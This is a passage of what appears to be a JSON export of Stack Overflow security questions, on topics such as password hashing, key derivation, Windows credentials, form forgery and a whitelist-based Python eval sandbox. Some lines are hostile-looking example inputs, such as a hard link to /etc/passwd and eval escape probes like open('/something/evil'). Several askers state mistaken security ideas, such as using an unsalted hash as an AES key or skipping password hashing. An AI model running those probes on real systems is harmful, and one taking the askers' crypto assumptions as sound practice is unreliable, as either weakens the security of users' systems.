&lt;vendor&gt;xxx&lt;/vendor&gt;\n&lt;/information&gt;\n&lt;security&gt;\n    &lt;all-permissions/&gt;\n&lt;/security&gt;\n&lt;update check=\"always\" policy=\"always\" /&gt;\n&lt;resources&gt;\n    &lt;java version=\"1.7+\" java-vm-args=\"-Xmx150m\" /&gt;\n    &lt;jar href=\"xxx-signed.jar\" main=\"true\" /&gt;\n&lt;/resources&gt;\n&lt;application-desc main-class=\"test.Main\"&gt;\n&lt;/application-desc&gt;\n&lt;/jnlp&gt;\n</code></pre>\n\n<p>Is there an easy way to disable these security dialogs? If not we have to fetch the images via our application backend.</p>\n"},{"tags":["security","database-design","encryption","passwords","web-security"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12530634,"title":"How necessary is it to Encrypt database password field","body":"<p>I heard that for security issues it is advised to keep the password field encrypted in the database.</p>\n\n<p>In case of my website only I can access the database. And I have no problem with me viewing others passwords as per our web site policy.</p>\n\n<p>Does this applicable to my website too OR there is some other security reason behind telling this.</p>\n"},{"tags":["c#",".net","security","permissions"],"answer_count":4,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":2460,"score":9,"question_id":1445388,"title":"Remove All Directory Permissions","body":"<p>In C# (2.0) How do I remove all permissions to a directory, so I can limit the access.  I will be adding access back to a limited set of users.</p>\n"},{"tags":["java","security","download","automation","webpage"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":80,"score":1,"question_id":12542266,"title":"How to download protected web page using Java","body":"<p>We have a task, to design a class which can download source of any web page.  But when I try to test my code and fetch page like <code>http://anidb.net/perl-bin/animedb.pl?show=main</code>  nothing is working.</p>\n\n<p>A standard code like this fails:</p>\n\n<pre><code>import java.net.*;\nimport java.io.*;\n\npublic class URLReader {\n    public static void main(String[] args) throws Exception {\n        URL link = new URL(\"http://www.anidb.net/\");\n        BufferedReader in = new BufferedReader(\n        new InputStreamReader(link.openStream()));\n\n        String inputLine;\n        while ((inputLine = in.readLine()) != null)\n            System.out.println(inputLine);\n        in.close();\n    }\n}\n</code></pre>\n\n<p>Here is the result I got:</p>\n\n<pre><code>&amp;#352;wq&gt;&amp;#178;\"5&amp;#180;_&amp;#239;__&amp;#199;U&amp;#186;=&amp;#244;&amp;#217;&amp;#246;?k&amp;#352;}~bd`?l&amp;#207;&amp;#231;z&amp;#162;&amp;#199;&amp;#234;&amp;#245;&gt;_\"?j&amp;#215;Ry}K&amp;#184;\\&amp;#204;c_DL&amp;#217;&amp;#170;&amp;#207;_\n    &amp;#243;Mm_&amp;#188;_0&amp;#246;&amp;#203;C_a&amp;#237;&amp;#189;s&amp;#238;&amp;#236;&amp;#193;S &gt;dC0&amp;#236;s_y&amp;#185;&amp;#241;&amp;#207;&amp;#221;&amp;#220;A&amp;#248;%&amp;#200;_&amp;#228;&amp;#214;&amp;#225;__&amp;#230;A@,4x&amp;#352;_&amp;#235;&amp;#201;&amp;#402;?\n</code></pre>\n\n<p>I have tried everything: cookies, header files but nothing seems to work. If you have some hint for me, I will appreciate it. </p>\n"},{"tags":["java","string","security"],"answer_count":3,"favorite_count":18,"up_vote_count":34,"down_vote_count":8,"view_count":1247,"score":26,"question_id":11146255,"title":"Create a mutable java.lang.String","body":"<p>It's common knowledge that Java <code>String</code>s are immutable. Immutable Strings are great addition to java since its inception. Immutability allows fast access and a lot of optimizations, significantly less error-prone compared to C-style strings, and helps enforce the security model.</p>\n\n<p>It's possible to create a mutable one without using hacks, namely</p>\n\n<ul>\n<li><code>java.lang.refect</code></li>\n<li><code>sun.misc.Unsafe</code></li>\n<li>Classes in bootstrap classloader</li>\n<li>JNI (or JNA as it requires JNI)</li>\n</ul>\n\n<p>But is it possible in just plain Java, so that the string can be modified at any time? The question is <em>How</em>?</p>\n"},{"tags":["c#","security","registry","default","file-type"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":362,"score":0,"question_id":6191096,"title":"Is there any way to programmatically set the \"UserChoice\" registry key to take over a file type association?","body":"<p>I have been trying to find a way to change the default file association for a specific file extension in windows 7. I have an app that is used to view .tif files that I want to prompt th user if its not the default viewer for that file type. If they choose to make it the default, I want to override the current default viewer. This works fine if there are no other viewers installed on the system. When there is another viewer that has been selected by the user, I cannot change the registry key that controls that here:</p>\n\n<p>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts.tif\\UserChoice</p>\n\n<p>I have scoured the web trying to find someone that has done this, but nobody seems to have any answers. When I try to update the \"Progid\" value within this key, I get a \"Cannot write to the registry key\" or \"Requested registry access is not allowed\" errors. The code is simple enough:</p>\n\n<pre><code>var path = @\"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.tif\\UserChoice\";\nvar key = Registry.CurrentUser.OpenSubKey(path, true);\nkey.SetValue(\"Progid\", \"myprogid...\");\n</code></pre>\n\n<p>Is there some special protection on this key that prevents it from being programmatically edited?</p>\n"},{"tags":["android","security","keychain","privatekey","jelly-bean"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":112,"score":1,"question_id":12507697,"title":"KeyChain.getPrivateKey(Context,String) on Android 4.1?","body":"<p>I read that there is problem with method KeyChain.getPrivateKey(Context,String) on Android 4.1 although on older versions it works. Does anybody has solution how to get private key on JellyBean? </p>\n\n<p>Saw this <a href=\"http://stackoverflow.com/questions/11261774/using-android-4-1-keychain\">Using Android 4.1 Keychain</a> , but somehow could not get to work with my case.</p>\n\n<p>Code that does not work on 4.1, but works great on older versions.</p>\n\n<pre><code>PrivateKey pk;\ntry {\n    pk = KeyChain.getPrivateKey(context,string);\n    byte[] pkByte = pk.getEncoded();\n    pkBase64 = new String(Base64.encode(pkByte, Base64.NO_WRAP));\n}\n</code></pre>\n\n<p>Edited: Found out that if I do not change certificate alias(default hex-hex-hex) when adding it, then getPrivateKey returns null, but when I change alias to, for example, aaa method returns something, but still not the correct privatekey. (for example, returned private key with primeP =null primeQ =null. On Android 4.0.4 primeP and primeQ are not null values)</p>\n"},{"tags":["linux","security","etcpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":45,"score":-3,"question_id":12539193,"title":"How to disable hard link to /etc/passwd","body":"<p>I am learning security recently, and noticed that on my experiment system I can create a hard link to /etc/passwd in my home directory, while on my work system I cannot:</p>\n\n<p>$ ln /etc/passwd\nln: failed to create hard link <code>./passwd' =&gt;</code>/etc/passwd': Operation not permitted</p>\n\n<p>What is done to disable this?</p>\n"},{"tags":["c#","windows","security","winapi"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":855,"score":2,"question_id":254980,"title":"Help with CredEnumerate","body":"<p>As a follow-up to <a href=\"http://stackoverflow.com/questions/199518/how-to-programatically-add-mapped-network-passwords-winxp\">this</a> question I am hoping someone can help with the <a href=\"http://msdn.microsoft.com/en-us/library/aa374794(VS.85).aspx\" rel=\"nofollow\">CredEnumerate</a> API.  </p>\n\n<p>As I understand from the documentation the PCREDENTIALS out parameter is a \"pointer to an array of pointers to credentials\". I am able to successfully call the CredEnumerate API using C# but I am not sure of how to convert the PCREDENTIALS into something useful (like a list of credentials).</p>\n\n<p>Edit: Here's the code I am using:</p>\n\n<pre><code>        int count = 0;\n        IntPtr pCredentials = IntPtr.Zero;\n        bool ret = false;\n        ret = CredEnumerate(null, 0, out count, out pCredentials);\n        if (ret != false)\n        {\n            IntPtr[] credentials = new IntPtr[count];\n            IntPtr p = pCredentials;\n            for (int i = 0; i &lt; count; i++)\n            {\n                p = new IntPtr(p.ToInt32() + i);\n                credentials[i] = Marshal.ReadIntPtr(p);\n            }\n            List&lt;Credential&gt; creds = new List&lt;Credential&gt;(credentials.Length);\n            foreach (IntPtr ptr in credentials)\n            {\n                creds.Add((Credential)Marshal.PtrToStructure(ptr, typeof(Credential)));\n            }\n        }\n</code></pre>\n\n<p>Unfortunately, while this works for the first credential in the arrayit gets generated and added to the list correctlysubsequent array items bomb at Marshal.PtrToStructure with the following error:</p>\n\n<p><em>Attempted to read or write protected memory. This is often an indication that other memory is corrupt.</em></p>\n\n<p>Any ideas? Anyone? Bueller?</p>\n"},{"tags":["security","internationalization","dojo","accessibility"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":126,"score":3,"question_id":2478989,"title":"What are some arguments to support the position that the Dojo JavasScript library is secure, accessible, and performant?","body":"<p>We have developed a small web application for a client. We decided on the Dojo framework to develop the app (requirements included were full i18n and a11y). Originally, the web app we developed was to be a \"prototype\", but we made the prototype production quality anyway, just in case. It turns out that the app we developed (or a variant of it) is going to production (many months hence), but it's so awesome that the enterprise architecture group is a little afraid.</p>\n\n<p>508c compliant is a concern, as is security for this group. I now need to justify the use of Dojo to this architecture group, explicitly making the case that Dojo does not pose a security risk and that Dojo will not hurt accessibility (and that Dojo is there to help meet core requirements).</p>\n\n<p>Note: the web app currently requires JavaScript to be turned on and a stylesheet to work. We use a relatively minor subset of Dojo: of course, dojo core, and dijit.form.Form, ValidationTextBox and a few others. We do use dojox.grid.DataGrid (but no drag N drop or editable cells, which are not fully a11y).</p>\n\n<p>I have done some research of my own, of course, but I any information or advice you have would be most helpful.</p>\n\n<p>Regards,\nLES2</p>\n"},{"tags":["c#",".net","security","dynamics-crm","dynamics-crm-2011"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12526943,"title":"How to implement security model in MS CRM?","body":"<p>I'm trying to secure certain information in MS-CRM. What is the best approach to restrict a user from reading everybody's e-mails or reading certain contacts? </p>\n\n<p>Is this done on the UI or by .NET code. I've researched the security model <a href=\"http://msdn.microsoft.com/en-us/library/gg309524.aspx\" rel=\"nofollow\" title=\"MS-CRM\">MS-CRM</a> but cant find a decent example or small walk-through to get started. </p>\n\n<p>Any help is appreciated. Thanks.</p>\n\n<p>EDIT:</p>\n\n<p>I've been interacting very litlle with MSCRM, mainly thru code, using SDK. It may be my unexperience with the UI and the system in general. </p>\n\n<p>We need to secure thousands of emails from users accounts and a few contacts. There seems to be many ways to implement the security, such as for example the 2 links below.</p>\n\n<p><a href=\"http://dynamics2011.blogspot.com/2012/04/crm-2011-utilizing-role-based-security.html\" rel=\"nofollow\">http://dynamics2011.blogspot.com/2012/04/crm-2011-utilizing-role-based-security.html</a>\n  -CRM 2011 using roles, teams, and business units seems \"easier\" than below\n<a href=\"http://www.powerobjects.com/blog/2012/07/27/making-crm-records-private/\" rel=\"nofollow\">http://www.powerobjects.com/blog/2012/07/27/making-crm-records-private/</a>\n  -CRM 2011 using roles, teams, and business units (this has 2 options)</p>\n\n<p>Any idea on which would be a better?, or maybe someone has another idea. I'm looking for something simple.</p>\n"},{"tags":["php","security","passwords"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12536210,"title":"Ways to handle losing track of which user ID requests a password reset after POSTing","body":"<p>I'm writing a password reset page.</p>\n\n<p>Logic:</p>\n\n<ol>\n<li>User requests pw</li>\n<li>It's sent to their email with a unique string (that expires) appended to the /reset/<code>$string</code></li>\n<li>Once at the page in my controller I check if the string matches one in the db, if so then I match that to the userId</li>\n<li>If it does, I allow them to enter their new pass</li>\n<li>If they POST to the same controller and mess up and enter 2 incorrect passwords, I lose the original URL with the reset string\nso now I don't know which user to update in the db</li>\n</ol>\n\n<p>My options (that I can think of):</p>\n\n<ol>\n<li>Set the string and user ID in a session and look that up in the controller (and make sure to clear this out once the pass is successfully reset)</li>\n<li>On step 4 above, I'll add in the user's ID in a hidden input field in the form and POST with that to check which user it is</li>\n</ol>\n"},{"tags":["security","view","escaping","zend-framework2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12342008,"title":"How to automatically escape variables in a Zend Framework 2 view","body":"<p>A lot of times in a Zend Framework 2 view I'll be calling <code>$this-&gt;escapeHtml()</code> to make sure my data is safe. Is there a way to switch this behaviour from a blacklist to a whitelist? </p>\n\n<p>PS: Read an article from Padraic Brady that suggests that <a href=\"http://blog.astrumfutura.com/2012/06/automatic-output-escaping-in-php-and-the-real-future-of-preventing-cross-site-scripting-xss/\" rel=\"nofollow\">automatic escaping is a bad idea</a>. Additional thoughts?</p>\n"},{"tags":["security","logging","exploit","php5-fpm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12535694,"title":"PHP5-FPM - Log postdata to catch 0day exploit","body":"<p>It appears that a malicious user has found an exploit in a piece of PHP software I run but didn't write. The exploit isn't critical, he can't upload files or execute arbitrary code, but it's still a major pain and I'd like to fix it.</p>\n\n<p>The system is modular, and it's an exploit in one particular module that's composed of maybe 50 files.</p>\n\n<p>That means that <strong>all</strong> requests go through index.php and the appropriate module is called.</p>\n\n<p>Is there a way I can log the execution in a generic way of a particular file, with a timestamp, the user's IP, the file that was logged, and the $_POST array so I can catch the exploit? I want to avoid putting logging code in each individual file because that would be a huge effort. I could log all files and all postdata, but that log would be significantly larger and I don't know how long I'd have to run the logging until I catch it.</p>\n\n<p>My configuration is PHP5-FPM and nginx.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#",".net","security","encryption","cryptography"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":100,"score":0,"question_id":12533549,"title":"Why can't we just use a hash of passphrase as the encryption key (and IV) with symmetric encryption algorithms?","body":"<p>Inspired by <a href=\"http://stackoverflow.com/questions/12529574/\" title=\"my previous question\">my previous question</a>, now I have a very interesting idea: Do you really ever need to use <code>Rfc2898DeriveBytes</code> or similar classes to \"securely derive\" the encryption key and initialization vector from the passphrase string, or will just a simple hash of that string work equally well as a key/IV, when encrypting the data with symmetric algorithm (e.g. AES, DES, etc.)?</p>\n\n<p>I see tons of AES encryption code snippets, where <code>Rfc2898DeriveBytes</code> class is used to derive the encryption key and initialization vector (IV) from the password string. It is assumed that one should use a random salt and a shitload of iterations to derive secure enough key/IV for the encryption. While deriving bytes from password string using this method is quite useful in some scenarios, I think that's not applicable when encrypting data with symmetric algorithms! Here is why: using salt makes sense when there is a possibility to build precalculated rainbow tables, and when attacker gets his hands on hash he looks up the original password as a result. But... with symmetric data encryption, I think this is not required, as the hash of password string, or the encryption key, is never stored anywhere. So, if we just get the SHA1 hash of password, and use it as the encryption key/IV, isn't that going to be equally secure?</p>\n\n<p>What is the purpose of using <code>Rfc2898DeriveBytes</code> class to generate key/IV from password string (which is a very very performance-intensive operation), when we could just use a SHA1 (or any other) hash of that password? Hash would result in random bit distribution in a key (as opposed to using string bytes directly). And attacker would have to brute-force the whole range of key (e.g. if key length is 256bit he would have to try 2^256 combinations) anyway.</p>\n\n<p>So either I'm wrong in a dangerous way, or all those samples of AES encryption (including many upvoted answers here at SO), etc. that use <code>Rfc2898DeriveBytes</code> method to generate encryption key and IV are just wrong.</p>\n"},{"tags":["security"],"answer_count":4,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":1851,"score":12,"question_id":2995143,"title":"Open source web site vulnerability scanners?","body":"<p>I would like to integrate vulnerability scanner as part of our build process. Are there any open source tools worth looking at?</p>\n"},{"tags":["c#",".net","security","encryption","cryptography"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":130,"score":2,"question_id":12529574,"title":"Is it ok to use SHA1 hash of password as a salt when deriving encryption key and IV from password string?","body":"<p>I'm using <code>Rfc2898DeriveBytes</code> to securely generate encryption key and initialization vector from user-supplied string password, to use with symmetric encryption (e.g. AesManaged).</p>\n\n<p>I'm taking the SHA1 hash of password as a salt parameter to <code>Rfc2898DeriveBytes</code>. Is that ok? If not, then where should I get the salt from? I will need the same salt when decrypting, right? So I have to store it somewhere unencrypted - unsecured. If I have to store it securely, then it just becomes another \"password\", isn't it?</p>\n\n<pre><code>void SecureDeriveKeyAndIvFromPassword(string password, int iterations, \n    int keySize, int ivSize, out byte[] key, out byte[] iv)\n{\n    // Generate the salt from password:\n\n    byte[] salt = (new SHA1Managed()).ComputeHash(Encoding.UTF8.GetBytes(password));\n\n    // Derive key and IV bytes from password:\n\n    Rfc2898DeriveBytes derivedBytes = new Rfc2898DeriveBytes(password, salt, iterations);\n\n    key = derivedBytes.GetBytes(keySize);\n    iv = derivedBytes.GetBytes(ivSize);\n}\n</code></pre>\n\n<p>I've seen using the constant (hard-coded) salt, and I've seen people complaining about it. I thought deriving salt from password would be the better idea, but I'm not sure this is an optimal solution.</p>\n\n<p>Shortly, I have a file that needs to be encrypted, and password string input by user. How do I properly use <code>Rfc2898DeriveBytes</code> to derive secure encryption key and IV?</p>\n\n<p>Thanks.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Thanks for your answers. I now understand that the main (maybe only?) purpose of salt is to make generation of rainbow tables impossible - you can't pre-generate the hash of \"P@$$w0rd\" because it will have a different hash for each possible salt value. I understand this perfectly, BUT... Is this really relevant to symmetric encryption? I'm not storing the hash anywhere right? So even if the attacker has the rainbow table for all possible password combinations, he can't do much, right?</p>\n\n<p>So, my question now is: Is there any advantage of using the random salt in each encryption operation, compared to using password-derived (or even hard-coded) salt, <strong>when used with symmetric encryption algorithms</strong> (like AesManaged of .NET)?</p>\n"},{"tags":["spring","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12529926,"title":"Is there a Spring Security default configuration file name?","body":"<p>When Spring deals with configuration filenames, there are some defaults...</p>\n\n<ul>\n<li>When registering a DispatcherServlet in my web.xml, Spring looks up by default for a file named <code>&lt;servletname&gt;</code>-servlet.xml</li>\n<li>When registering a ContextLoadListener in my web.xml, Spring looks up by default for a file names applicationContext.xml</li>\n</ul>\n\n<p>Therefore I ask: When I am using Spring Security, does Spring looks up a default filename? Or do I always have to configure it manually through <code>&lt;context-param&gt; &lt;param-name&gt; contextConfigLocation &lt;/param-name&gt;filename&lt;/param-value&gt;&lt;/context-param&gt;</code>...???</p>\n"},{"tags":["security","ssl","wildcard-subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12529917,"title":"wildcard SSL from comodo and cheapssls.com","body":"<p>I want to buy SSL for one of our doamins which has 2-3 subdomains. Now I have tried to lookup and found that I'll need wildcard SSL and I was looking up at Comodo's wildcard SSL and also found Comodos' essential wildcard SSL form <a href=\"http://www.cheapssls.com/comodo-ssl-certificates/essentialssl-wilcard.html\" rel=\"nofollow\">cheapssls</a></p>\n\n<p>Now my questions is there is huge price difference i.e. comodo.com site sells for around $334 a year wherease cheapssls.com has one with $99. I also noticed warranty amount difference comodo.com site has warranty for $2,50,000 where as cheapssls.com has $10,000</p>\n\n<p>Can any one suggest why is the difference and if it's ok to buy from cheapssls.com? Thanks in advance.</p>\n"},{"tags":["asp.net","security","configuration","rsa"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12529571,"title":"Are keys in the RSA Key container encrypted?","body":"<p>We were using the \"RSA Protected Configuration provider\" to encrypt sensitive information in our config files. More info about this on MSDN at - <a href=\"http://msdn.microsoft.com/en-us/library/ms998283.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms998283.aspx</a>.</p>\n\n<p>In the generated config file there is a triple-DES encrypted key. So that means the config section is actually encrypted/decrypted using this symmetric key.</p>\n\n<p>But this symmetric DES key is actually encrypted/decrypted using the RSA private/public key in the RSA key container. The question I have is whether the public/private RSA keys in the container are also encrypted? If yes, then where is the key for that stored?</p>\n\n<p>If the keys in the container are not encrypted, then why do we need to export the keys to a XML file and them import them in another machine? Why not just copy-paste the RSA container key to all nodes in a web cluster/farm?</p>\n"},{"tags":["mysql","xcode","json","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12528748,"title":"Security when getting data from MySQL/PHP via JSON in XCode","body":"<p>Im making a company pricelist app for the iPhone.</p>\n\n<p>Most of my application is finished, except for the security part.</p>\n\n<p>I use PHP to extract from the SQL database, and encode it as JSON.\nAll this is fine, except.</p>\n\n<p>I would like to protect my pricelist data from others not accessing the URL request from a browser.\nIm not a great web / php programmer and Im not sure how to implement this on the serverside.</p>\n\n<p>For now I have just made a user/password in the URLRequest like</p>\n\n<p>www.hopepage.com/searchDB?User=Jack&amp;Pass=Jones&amp;Comp=iPhone%</p>\n\n<p>In the PHP I have then made something like</p>\n\n<p>IF user and pass in user database then\n    Select * from components where comp like &amp;Comp</p>\n\n<p>However, this request shows my login in the URL string, an what is somebody sniffs this string ? I guess this is fairly easily possible ?</p>\n\n<p>I have read a bit about SSL and HTTPS, but Im not sure how to implement it on the serverside.</p>\n\n<p>Anybody knows about good documentation, or can lead me in the right direction ?\nMaybe a tutorial hidden somewhere on the net (I have searched, but maybe not used the correct words).\nAnybody </p>\n"},{"tags":["windows","security","dll","command-line"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":55,"score":-1,"question_id":12527476,"title":"how to replace shimgvw.dll in windows 7","body":"<p>On windows XP, I easily replace the corrupted shimgvw.dll with original so that I could recover the problem of displaying the picture on thumbnail view and opening it with windows fax viewer.</p>\n\n<p>But I can't replace shimgvw.dll on windows 7. I have tried replacing from <strong>safe mode with command prompt</strong>, but I can't. </p>\n\n<p>Is there any command-line(like nautilus of LINUX) to break security so that <strong>windows 7</strong> will allows us to replace the file on system32 folder?</p>\n"},{"tags":["android","security","hacking","malware"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":12523565,"title":"Is it possible for an application to have a security hole that a malware can exploit?","body":"<p>I'm currently doing a research on the different Android malwares and how they can affect an application. However, my research shows that Android malwares are distributed either via repackaged counterfeit applications or original applications with hidden malware.</p>\n\n<ul>\n<li>If this is so, does it mean that your device can only be infected if you downloaded an already infected application? Or is it possible for a legitimate application that is already installed in the device to get infected?</li>\n<li>Is there an existing malware that can infect an already installed application? What is it?</li>\n<li>How do malwares infect an already installed application?</li>\n<li>What are the different possible security holes in an application that a malware can exploit?</li>\n<li>How do you protect an application against malwares? What are the safety measures in coding to avoid malware exploit?</li>\n</ul>\n\n<p>Please be rest assured that I have no intention to create a malware. I'm asking these questions to know if there is any way in code that I can protect my application against malwares. I'm developing a mobile banking application so the security of the application is crucial.</p>\n"},{"tags":["python","security","parsing","eval"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12523516,"title":"Using ast and whitelists to make python's eval() safe?","body":"<p>OK. I <a href=\"http://stackoverflow.com/questions/3513292/python-make-eval-safe\">know</a> <a href=\"http://stackoverflow.com/questions/1994071/how-safe-is-expression-evaluation-using-eval\">the</a> <a href=\"http://stackoverflow.com/questions/28369/is-safe-eval-really-safe\">experts</a> <a href=\"http://stackoverflow.com/questions/5351059/is-this-a-safe-use-of-python-eval\">have</a> <a href=\"http://me.veekun.com/blog/2012/03/24/on-principle/\" rel=\"nofollow\">spoken</a> and you should not <em>ever</em> use python's <code>eval()</code> on untrusted data, ever. I'm not smarter than the rest of the world, and shouldn't even try this. But! I'm going to, anyhow.</p>\n\n<p>My basic problem is that I'm looking to write a little calculator evaluator program that'll take untrusted input, using a subset of python's syntax. I know: use <a href=\"http://www.dabeaz.com/ply/\" rel=\"nofollow\">ply</a> or <a href=\"http://pyparsing.wikispaces.com/\" rel=\"nofollow\">pyparsing</a> and write a parser and there we go. Screwing around with passing globals and locals to <code>eval()</code> will not do the trick.</p>\n\n<p>All the approaches I've seen (and been leery about) try to enumerate evil. Here, I'm trying to enumerate <em>good</em> -- get an AST, allow only a few node types, and then verify that any calls are to one of a set of whitelisted functions. Here's a mini-implementation (and <a href=\"https://gist.github.com/3759435\" rel=\"nofollow\">a gist</a>):</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import ast\nimport math\n\nSAFE_FX = {\n    'exp': math.exp,\n}\n\nSAFE_NODES = set(\n    (ast.Expression,\n    ast.Num,\n    ast.Call,\n    ast.Name,\n    ast.Load,\n    ast.BinOp,\n    ast.Add,\n    ast.Sub,\n    ast.Mult,\n    ast.Div,)\n)\n\nclass CleansingNodeVisitor(ast.NodeVisitor):\n    def generic_visit(self, node):\n        if type(node) not in SAFE_NODES:\n            raise Exception(\"%s not in SAFE_NODES\" % type(node))\n        super(CleansingNodeVisitor, self).generic_visit(node)\n\n    def visit_Call(self, call):\n        if call.func.id not in SAFE_FX:\n            raise Exception(\"Unknown function: %s\" % call.func.id)\n\ndef my_safe_eval(s):\n    tree = ast.parse(s, mode='eval')\n    cnv = CleansingNodeVisitor()\n    cnv.visit(tree)\n    compiled = compile(tree, s, \"eval\")\n    return(eval(compiled, SAFE_FX))\n</code></pre>\n\n<p>So, <code>my_safe_eval('2*(4+exp(1.3))')</code> works, while <code>my_safe_eval('[].__class__')</code> tricks and <code>my_safe_eval('open(\"/something/evil\")')</code> is likewise forbidden -- without forbidding <code>__builtins__</code> or <code>__locals__</code> or anything.</p>\n\n<p>I... I think this works. Am I mad?</p>\n"},{"tags":["php","web-services","security","web-applications","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":12522836,"title":"PHP backend / frontend security","body":"<p><strong>Hello all,</strong></p>\n\n<p>While taking my time in the bath I though of something interesting. In PHP, how do you tell if the users' forms submitted is valid and not fraud (i.e. some other form on some other site with action=\"http://mysite.com/sendData.php\")? Because really, anyone can create a form that will try send and match $_POST variables in the real backend. How can I make sure that <strong><em>that</em></strong> script is legit (from my site and only my site) so I don't have some sort of cloning-site data-steal thing going on?</p>\n\n<p>I have some ideas but not sure where to start</p>\n\n<ul>\n<li>Generate a one-time key and store in hidden input field</li>\n<li>Attempt (however possible) to grab the url on which the form is located (probably not possible)</li>\n<li>Using some really complicated PHP goodies to determine where the data is sent (possible)</li>\n</ul>\n\n<p>Any ideas? Thanks all!</p>\n"},{"tags":["php","security","encryption","hash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":395,"score":0,"question_id":10329999,"title":"php encrypting passwords","body":"<p>Ok i know this topic is brought up a lot in <strong>stackoverflow</strong> but they don't underline the answers that im looking for.</p>\n\n<p>I use md5 encryption which i told(it was a while ago when i was a noob at php)was safe but if you look it up on good old google its has encrypted and decryption.</p>\n\n<p>so i started to look other places aka here.</p>\n\n<p>ive heard about all the encryption methods so for example SHA-1,MD5,SHA-2,SHA-256,SHA-512 and so on.</p>\n\n<p>A lot of people say use <strong>Bcrypt</strong> which im looking over, its that vs SHA-512.</p>\n\n<p>and people say use a random salt and save it in your database which is stupid because say a hacker hacks you database and get the salt of all your passwords so it's a small window to change all the salts before the hacker decrypts all the passwords and go on to other places and try them for instance <strong>facebook,google and stackoverflow</strong></p>\n\n<p>So my question is it the safest way doing it like this (encrypting (with SHA-512) and using a random salt which will also be stored in a database) or use a fixed salt which is hard wired into my php code which has the same amount of security as the database random salt.</p>\n\n<p>And i have read a lot of posts on this so i think i know what im talking about and i like to impassive that i have read many posts about this about 20 to be precise.</p>\n\n<p>OH almost forgot and is it safer if you encrypt the password multiple times or is about the same as only one encryption?</p>\n\n<p><strong>Thanks for you'r help on a much over written post</strong></p>\n\n<p>Im Sorry for the people im confusing a bit but i didn't get the point of some other peoples posts and i started rambling on about encryption but i was talking about hashing strings.</p>\n\n<p>sorry for that </p>\n"},{"tags":["ruby-on-rails","ruby","security","encryption","attachment-fu"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12521801,"title":"Encrypting data - rails + attachment_fu","body":"<p>We've been using attachment_fu to upload files into our application. We now have to be able to encrypt uploaded data using AES. We use Rails 2.3.8 and Ruby 1.8.7. Attachment_fu is being used to check MIMEtypes, so we can't encrypt with the before_save callback (or the MIMEtype will get corrupted) and attachment_fu uses temporary files, so I'm worried about co-opting attachment_fu's final save_to_storage method, because the temp files will be stored in plaintext before save occurs.</p>\n"},{"tags":["security","powershell","securestring"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":12520006,"title":"How secure is PowerShell's ConvertFrom-SecureString -key","body":"<p>I have a module that includes some strings with some private data that should be hard to attain, but changes frequently. I need to put this script on a variety of machines where it might be accessed and the code read by someone who should not have the information used to derive the output.</p>\n\n<p>I'm really concerned about strings that change from time to time so I'm considering creating a script which prompts for those values as secure strings and encrypts them using a key and dumps them into an xml file. The XML file then is used to provide the strings. Anyone running a command from this module that needs that data would have to provide the key so the strings could be decrypted. </p>\n\n<p>Here is basically what I expect to do, but I'll be dealing with objects </p>\n\n<pre><code>$secure = Read-Host -AsSecureString\n$encrypted =  ConvertFrom-SecureString -securestring $secure -key somekey\n$encrypted | Export-Clixml testing.xml\n$imported = Import-Clixml testing.xml\n$value = ConvertTo-SecureString -string $imported -key somekey\n</code></pre>\n\n<p>I understand that the string will be encrypted using the Rijndael encryption algorithm, which is also known as AES I believe.</p>\n\n<p>How much effort is needed to break that encrypted key where it rests in the xml file, given access to the script?</p>\n"},{"tags":["php","mysql","security","passwords","sql-injection"],"answer_count":4,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":140,"score":3,"question_id":12257386,"title":"PHP / MySQL forms: escaping, sanitizing, hashing.... where do I even start?","body":"<p>I'm usually pretty resourceful about finding information on my own, but when it comes to this subject, it's really daunting the sheer amount of stuff there is out there. I'm getting a bit of information overload.</p>\n\n<p>I've found dozens of articles on <em>individual</em> security topics, but I can't get a sense of the bigger picture and how it all 